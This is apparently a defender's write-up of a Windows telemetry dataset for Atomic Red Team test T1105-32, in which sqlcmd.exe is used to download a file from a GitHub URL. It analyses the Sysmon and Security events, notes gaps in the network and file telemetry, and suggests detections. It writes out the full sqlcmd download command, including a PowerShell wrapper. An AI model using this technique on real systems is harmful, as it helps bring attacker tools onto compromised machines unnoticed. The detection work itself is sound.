# T1105-32: Ingress Tool Transfer — File Download with Sqlcmd.exe

## Technique Context

T1105 (Ingress Tool Transfer) includes any mechanism an adversary uses to pull files into a compromised system. This test abuses `sqlcmd.exe`—the Microsoft SQL Server command-line query tool—to download a file from a URL. Sqlcmd's `-i` flag normally accepts a SQL script file path, but it also accepts a URL, silently fetching the content over HTTP. This is an uncommon LOLBin abuse path: sqlcmd is widely deployed on Windows systems where SQL Server or its management tools are installed, and its network behavior is rarely monitored as a download mechanism.

The test downloads `T1105.zip` from GitHub's raw content CDN, writing it to `C:\T1105.zip`. The invocation is: `sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip`.

## What This Dataset Contains

This dataset was collected on ACME-WS06, a Windows 11 Enterprise domain workstation with Microsoft Defender disabled. The technique executed fully.

**Process Chain (Security EID 4688 / Sysmon EID 1):**

The ART PowerShell test framework (PID 792) spawns a second PowerShell process (PID 1716, tagged `technique_id=T1059.001`) with the full sqlcmd invocation as its command line argument:

```
"powershell.exe" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip}
```

Security EID 4688 captures both the parent test framework PowerShell (creating PID 1716) and the subsequent sqlcmd execution under that child PowerShell. Sysmon EID 1 captures the same processes with hashes.

The child PowerShell (PID 1716) carries SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011, MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D, a hash consistent with a clean PowerShell binary but different from the test framework parent's runtime (PID 792 loaded the NativeImages assembly variants).

**Process Access (Sysmon EID 10):**

The test framework PowerShell (PID 792) accesses the child PowerShell (PID 1716) and the two `whoami.exe` pre/post-check instances (PIDs 2488 and 1532) with `GrantedAccess: 0x1FFFFF`. For the child-to-parent access on PID 1716, the CallTrace is `UNKNOWN(00007FFF54C998C5)`, indicating a return from an unresolvable module—typical for PowerShell's .NET managed execution stack.

**Image Loads (Sysmon EID 7):**

Seventeen DLL load events. The parent PowerShell (PID 792) loads the standard .NET runtime stack: `mscoree.dll`, `mscoreei.dll`, `clr.dll`. These are the same DLLs across all ART test framework instances.

**Pipe Creation (Sysmon EID 17):**

Two PSHost named pipes are created: `\PSHost.134180055433453672.792.DefaultAppDomain.powershell` (test framework, PID 792) and—by EID 11 evidence—a startup profile write by PID 1716 confirms a second PowerShell host initialization.

**PowerShell Script Block Logging (EID 4104):**

103 script block events. This is slightly higher than other T1105 tests (93 typical), likely because the child PowerShell instance (which actually runs sqlcmd) generates additional block logs for its own initialization.

**EID 11 (File Creation):**

The only Sysmon file creation captured is the PowerShell startup profile write at `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive`. The actual `C:\T1105.zip` output from sqlcmd is not captured—sqlcmd writes the file directly via its own I/O, and the file target (`C:\T1105.zip` at the root of the C: drive) may fall outside Sysmon's file monitoring filter rules, which are often configured to monitor specific directories like `%TEMP%`.

## What This Dataset Does Not Contain

There is no Sysmon EID 3 network connection event and no EID 22 DNS query capturing sqlcmd's outbound HTTP request to GitHub. Sqlcmd performs its network I/O through the SQL Server ODBC/TDS stack rather than WinSock in a way that Sysmon's network monitoring may not capture with standard configurations.

The destination file `C:\T1105.zip` does not appear in an EID 11 event, as noted above. You cannot directly confirm the file was written from Sysmon telemetry alone—you would need to correlate with filesystem artifacts or endpoint inventory. The HTTP response content, headers, and the SQL "output" from sqlcmd are not logged.

No Security channel 4688 event captures sqlcmd.exe itself spawning (sqlcmd is run within the child PowerShell process, not as a separate child process visible to the Security audit policy in this configuration).

## Assessment

This dataset captures the upstream evidence of a sqlcmd-based download—the full command line in both Security 4688 and Sysmon EID 1—but lacks the downstream file creation and network telemetry that would confirm the download completed. The command line `sqlcmd -i <https-url> -o <local-path>` is the primary indicator, and it appears clearly in the Security channel. The absence of network or file creation events reflects instrumentation gaps rather than technique failure.

Compared to the defended variant, the undefended dataset has more PowerShell events (103 vs. ~36 defended) because Defender's absence means no scan-related process spawning occurs. The Security event count is lower (3 vs. defended's higher baseline) because MpCmdRun.exe processes that Defender spawns in response to downloads are absent.

The dataset timestamp window (23:45:43Z–23:45:50Z, 7 seconds) is short, consistent with a single download operation to a fast CDN endpoint.

## Detection Opportunities Present in This Data

**Sqlcmd with a URL as the -i argument (EID 4688 / EID 1):** The command line `sqlcmd -i https://...` is highly anomalous. Sqlcmd is a database tool; its input flag should point to `.sql` script files, not HTTPS URLs. Any occurrence of sqlcmd with an HTTP/HTTPS argument should be flagged.

**PowerShell spawning sqlcmd with external URL (EID 1):** `powershell.exe & {sqlcmd -i https://...}` is a non-standard pattern. The `& {<block>}` syntax passing sqlcmd with a URL argument is a direct indicator of scripted LOLBin abuse.

**Output to writable non-standard paths:** The `-o C:\T1105.zip` argument writes directly to the system root. Monitoring for file writes to `C:\` by sqlcmd (if captured) would be complementary.

**Sysmon rule tag:** The child PowerShell spawning is tagged `technique_id=T1059.001`, indicating the built-in Sysmon ruleset identifies the PowerShell invocation pattern.
